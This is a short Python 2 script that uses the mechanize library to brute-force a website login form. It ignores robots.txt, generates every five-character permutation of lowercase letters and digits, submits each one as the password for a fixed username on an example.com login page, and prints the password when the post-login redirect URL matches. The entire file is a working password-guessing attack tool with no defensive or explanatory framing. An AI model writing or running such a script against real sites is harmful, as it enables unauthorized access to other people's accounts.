#!/usr/bin/python
import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

l = []
combos = itertools.permutations("abcdefghijklmnopqrstuvwxyz0123456789",5)
for x in combos:
    l.append(''.join(x))

br.open("http://www.example.com/login/")
for x in l:
	br.select_form( nr = 0 )
	br.form['userName'] = "user name"
	br.form['password'] = ''.join(x)
	print "Checking ",br.form['password']
	response=br.submit()
	if response.geturl()=="http://www.example.com/redirected_to_url":
		#url to which the page is redirected after login
		print "Correct password is ",''.join(x)
		break